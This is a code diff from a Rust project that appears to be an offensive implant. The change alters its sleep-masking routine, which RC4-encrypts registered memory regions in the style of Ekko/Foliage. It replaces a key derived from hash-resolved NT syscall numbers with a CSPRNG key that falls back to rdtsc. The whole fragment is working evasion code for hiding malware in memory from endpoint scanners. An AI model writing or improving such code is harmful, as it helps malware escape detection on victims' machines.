@@ -102,43 +102,18 @@ pub fn register_key(key: [u8; 32]) -> bool {
 /// Expands the 32-bit seed into a 32-byte key (RC4 has no key-length ceiling).
 /// Falls back to a fixed marker key if the runtime isn't up yet.
 pub(crate) fn mask_key() -> [u8; 32] {
-    let seed = match crate::syscalls::global() {
-        Some(rt) => {
-            // Sum a few well-known SSNs. Cheap (cold path, once per mask cycle).
-            let mut acc: u32 = 0x9E37_79B9;
-            let names: &[&[u8]] = &[
-                b"ntallocatevirtualmemory",
-                b"ntcreatefile",
-                b"ntwritefile",
-                b"ntreadfile",
-                b"ntclose",
-                b"ntdelayexecution",
-                b"ntqueryinformationprocess",
-            ];
-            for name in names {
-                if let Some(ssn) = rt.ssn_by_hash(crate::resolve::djb2(name)) {
-                    acc = acc.wrapping_add(ssn).rotate_left(3);
-                }
-            }
-            acc
-        }
-        None => 0x1234_5678,
-    };
-    // Expand the 32-bit seed into 32 key bytes by mixing rotations. This is NOT
-    // a CSPRNG — the threat model is "a snapshot taken mid-sleep isn't cleartext",
-    // not "an attacker with a debugger can't recover the key" (they can: the
-    // seed is in process memory). RC4 over this key is what SystemFunction032
-    // does in the real Ekko/Foliage flow.
     let mut key = [0u8; 32];
-    let mut s = seed;
-    for b in key.iter_mut() {
-        s = s
-            .wrapping_mul(0x9E37_79B9)
-            .rotate_left(7)
-            .wrapping_add(0xA5A5_A5A5);
-        *b = (s & 0xFF) as u8;
+    if crate::entry::csprng_fill(&mut key) {
+        key
+    } else {
+        // Dynamic fallback using a tick count or high-resolution timer to maintain key diversity
+        let mut acc = unsafe { core::arch::x86_64::_rdtsc() };
+        for b in key.iter_mut() {
+            acc = acc.wrapping_mul(0x9E37_79B9).rotate_left(7);
+            *b = (acc & 0xFF) as u8;
+        }
+        key
     }
-    key
 }
 
 /// Apply RC4 (via the pure core) to every registered region in place. RC4 is an
